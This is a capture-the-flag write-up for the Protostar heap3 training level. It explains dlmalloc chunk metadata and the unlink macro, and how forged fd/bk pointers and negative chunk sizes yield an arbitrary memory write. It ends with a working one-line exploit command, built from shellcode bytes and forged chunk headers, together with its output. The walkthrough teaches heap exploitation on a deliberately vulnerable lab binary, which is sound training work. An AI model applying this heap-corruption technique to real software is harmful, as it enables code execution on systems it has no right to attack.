#### Protostar Heap3 

##### About
This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to change program execution.  
  
This level is at /opt/protostar/bin/heap3

##### Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}
```

##### Solution
Obviously we can BOF with strcpy(), but the real exploit point is in free().  
  
-- An allocated chunk managed by Doug Lea's Malloc looks like this:
```
    chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
             | prev_size: size of the previous chunk, in bytes (used   |
             | by dlmalloc only if this previous chunk is free)        |
             +---------------------------------------------------------+
             | size: size of the chunk (the number of bytes between    |
             | "chunk" and "nextchunk") and 2 bits status information  |
      mem -> +---------------------------------------------------------+
             | fd: not used by dlmalloc because "chunk" is allocated   |
             | (user data therefore starts here)                       |
             + - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
             | bk: not used by dlmalloc because "chunk" is allocated   |
             | (there may be user data here)                           |
             + - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
             |                                                         .
             .                                                         .
             . user data (may be 0 bytes long)                         .
             .                                                         .
             .                                                         |
nextchunk -> + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
             | prev_size: not used by dlmalloc because "chunk" is      |
             | allocated (may hold user data, to decrease wastage)     |
             +---------------------------------------------------------+
```

-- Free chunks are stored in circular doubly-linked lists and look like this:
```
    chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
             | prev_size: may hold user data (indeed, since "chunk" is |
             | free, the previous chunk is necessarily allocated)      |
             +---------------------------------------------------------+
             | size: size of the chunk (the number of bytes between    |
             | "chunk" and "nextchunk") and 2 bits status information  |
             +---------------------------------------------------------+
             | fd: forward pointer to the next chunk in the circular   |
             | doubly-linked list (not to the next _physical_ chunk)   |
             +---------------------------------------------------------+
             | bk: back pointer to the previous chunk in the circular  |
             | doubly-linked list (not the previous _physical_ chunk)  |
             +---------------------------------------------------------+
             |                                                         .
             .                                                         .
             . unused space (may be 0 bytes long)                      .
             .                                                         .
             .                                                         |
nextchunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
             | prev_size: size of "chunk", in bytes (used by dlmalloc  |
             | because this previous chunk is free)                    |
             +---------------------------------------------------------+
```

The circular doubly-linked lists are used to managed free chunks so that they can be allocated for later use.  
  
When free an allocated chunk mentioned above, function free() will check the previous and next chunk beside it in memory are free chunks or not, and then consolidate it with the free chunk, to increase allocation performance and reduce fragmentation.
  
The free chunks should be unlinked from the circular doubly-linked list before consolidation, then be joined to the list again as a single chunk after consolidation. Because though these chunks are next to each others in memory, they may be not the adjacent nodes in the circular doubly-linked list.  
  
The operation unlinked a free chunk look like this:
```
/* take a chunk off a list */

#define unlink(P, BK, FD) \
{ \
BK = P->bk; \
FD = P->fd; \
FD->bk = BK; \
BK->fd = FD; \
} 
```

Both of the memory writes use source and destination addresses stored in the chunk headers, specifically chunk forward and backward pointers. we can control the pointers to write any 4 bytes to anywhere if the location is writable.  
  
During freeing a chunk, the operation mentioned above is executed only when the following conditions are satisfied:  
1. (a) The IS_MMAPPED bit(penult bit of chunk->size) of this chunk should be set to 0.  
2. (b) The previous chunk is a free chunk, which means the PREV_INUSE bit(last bit of chunk->size) of this chunk should be set to 0;  
or (c) The next chunk is a free chunk, which means the PREV_INUSE bit(last bit of chunk->size) of next next chunk should be set to 0.

We can satisfy these conditions by BOF and counterfeit fd and bk pointers to change the program execution process or execute our shellcode in heap.  

There's still one thing should be noticed, function free() try to find the previous chunk or the next chunk by minusing this chunk's prev_size from or adding it's size to it's starting address. These two sizes can be set to negative so that we can construct two virtual chunks controlled by us and bypass the null character.
  
To write a workable payload please refer to the first reference, it is very explicit and easy-to-understand.
```
$ ./heap3 `python -c 'print "\x90"*10 + "\x68\x64\x88\x04\x08\xc3 " + "\xff"*32 + "\xfc\xff\xff\xff"*2 + " CCCC\x1c\xb1\x04\x08\x04\xc0\x04\x08"'`
that wasn't too bad now, was it? @ 1417761066
```

##### Reference
<https://thesprawl.org/research/exploit-exercises-protostar-heap/#heap-3>  
<http://www.phrack.org/issues/57/8.html>  
